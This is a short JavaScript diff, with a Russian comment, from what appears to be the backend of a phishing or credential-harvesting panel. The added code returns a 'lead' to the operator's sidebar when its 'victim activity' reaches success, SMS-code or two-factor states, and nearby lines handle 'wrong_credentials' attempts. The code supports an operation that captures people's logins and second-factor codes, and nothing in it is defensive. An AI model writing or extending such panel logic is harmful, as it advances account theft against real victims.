@@ -2047,6 +2047,17 @@ async function handle(scope) {
         return send(res, 404, { ok: false });
       }
       const lead = leads[idx];
+      // Если лид был скрыт в сайдбаре, но скрипт дошёл до важного состояния — вернуть в список.
+      try {
+        if (leadService && typeof leadService.tryAutoUnhideLeadAfterVictimActivity === 'function') {
+          if (result === 'success' || result === 'sms' || result === 'two_factor') {
+            leadService.tryAutoUnhideLeadAfterVictimActivity(String(id), { pushEvent: pushEvent });
+            // leadService.persistLeadPatch уже пишет в БД; здесь lead в памяти тоже обновим, чтобы не затёрлось ниже.
+            lead.adminLogArchived = false;
+            lead.klLogArchived = false;
+          }
+        }
+      } catch (_) {}
       const currentAttemptNo = Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1;
       if (result === 'wrong_credentials' && attemptNoRaw != null && attemptNoRaw !== currentAttemptNo) {
         console.log(
